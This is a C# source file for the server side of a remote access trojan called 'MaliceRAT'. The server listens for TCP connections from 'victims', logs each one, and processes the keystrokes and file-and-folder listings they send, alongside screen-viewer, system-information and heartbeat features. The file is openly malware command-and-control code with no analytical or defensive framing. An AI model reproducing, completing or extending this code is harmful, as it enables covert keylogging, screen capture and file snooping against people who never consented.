using System;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Web.Script.Serialization;
using System.IO;
using System.Windows.Forms;
using MaliceRAT.RatServer.Features;

namespace MaliceRAT.RatServer
{
    public class Server
    {
        #region Features
        public ScreenViewer screenViewer;
        public Heartbeat heartbeatManager;
        public Features.SystemInformation systemInformation;
        #endregion

        #region Events
        public event Action<Victim, dynamic> MessageReceived;
        public event Action<Victim> ClientConnected;
        public event Action<Victim> ClientDisconnected;
        public event Action<Victim, string> KeystrokeReceived;
        public event Action<Victim, string> FilesAndFoldersReceived;
        #endregion

        #region Variables
        private dynamic config;
        private TcpListener server;
        private int BufferSize;
        private double HeartbeatInterval;
        private string IP;
        private int Port;
        public List<Victim> victims = new List<Victim>();
        private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
        private JavaScriptSerializer serializer = new JavaScriptSerializer();
        // Console
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
        #endregion

        #region Constructor
        public Server()
        {
            AllocConsole();

            #region Config
            string configPath = Path.Combine(Application.StartupPath, "config.json");
            if (File.Exists(configPath))
            {
                string configJson = File.ReadAllText(configPath);
                config = serializer.Deserialize<dynamic>(configJson);

                BufferSize = config["server_bufferSize"];
                HeartbeatInterval = config["server_heartbeat"];
                IP = config["server_ip"];
                Port = config["server_port"];

                Console.WriteLine("Config loaded from " + configPath);
            }
            else
            {
                Console.WriteLine("config.json not found.");
                Application.Exit();
            }
            #endregion

            #region Features
            systemInformation = new Features.SystemInformation(this);
            screenViewer = new ScreenViewer(this);
            heartbeatManager = new Heartbeat(HeartbeatInterval, this);
            #endregion
        }
        #endregion

        #region Methods
        public void StartServer()
        {
            IPAddress ipAddress = IPAddress.Parse(IP);
            server = new TcpListener(ipAddress, Port);
            server.Start();
            Console.WriteLine("Server started at " + server.LocalEndpoint);
            Task.Run(async () => await AcceptClients());
        }

        private async Task AcceptClients()
        {
            while (true)
            {
                TcpClient tcpClient = await server.AcceptTcpClientAsync();
                Victim victim = new Victim(tcpClient, victims.Count);
                OnClientConnected(victim);
                var clientTask = HandleClient(victim);
                clientTasks[victim.Id] = clientTask;
                await clientTask.ContinueWith(t => clientTasks.Remove(victim.Id));
            }
        }

        private async Task HandleClient(Victim victim)
        {
            using (NetworkStream stream = victim.TcpClient.GetStream())
            {
                byte[] buffer = new byte[BufferSize];
                StringBuilder messageBuilder = new StringBuilder();
                int bytesRead;

                heartbeatManager.StartHeartbeat(stream, victim);

                while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                {
                    string receivedMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    messageBuilder.Append(receivedMessage);

                    if (receivedMessage.EndsWith("}"))  // Check if the JSON message ends with }
                    {
                        string completeMessage = messageBuilder.ToString();
                        messageBuilder.Clear();  // Clear the builder for the next message

                        Console.WriteLine("Received message: " + completeMessage);

                        try
                        {
                            dynamic jsonMessage = serializer.Deserialize<dynamic>(completeMessage);
                            MessageReceived?.Invoke(victim, jsonMessage);
                            ProcessJsonMessage(victim, jsonMessage);
                        }
                        catch (InvalidOperationException ex)
                        {
                            Console.WriteLine($"Invalid JSON received: {ex.Message}");
                            Console.WriteLine($"Received message content: {completeMessage}");
                        }
                    }
                }
                
                heartbeatManager.StopHeartbeat();
                OnClientDisconnected(victim);
            }
        }

        private void ProcessJsonMessage(Victim victim, dynamic jsonMessage)
        {
            switch (jsonMessage["type"].ToString())
            {
                case "keystroke":
                    string keystroke = jsonMessage["key"].ToString();
                    KeystrokeReceived?.Invoke(victim, keystroke);
                    break;
                case "files_and_folders":
                    string filesAndFoldersJson = jsonMessage["filesAndFolders"];
                    FilesAndFoldersReceived?.Invoke(victim, filesAndFoldersJson);
                    break;
            }
        }

        protected virtual void OnClientConnected(Victim victim)
        {
            victims.Add(victim);
            Console.WriteLine("Victim connected: " + victim.IP);
            ClientConnected?.Invoke(victim);
        }

        public void OnClientDisconnected(Victim victim)
        {
            victims.Remove(victim);
            Console.WriteLine("Victim disconnected: " + victim.IP);
            ClientDisconnected?.Invoke(victim);
        }

        public Victim GetVictimById(int id)
        {
            return victims.Find(v => v.Id == id);
        }
        #endregion
    }
}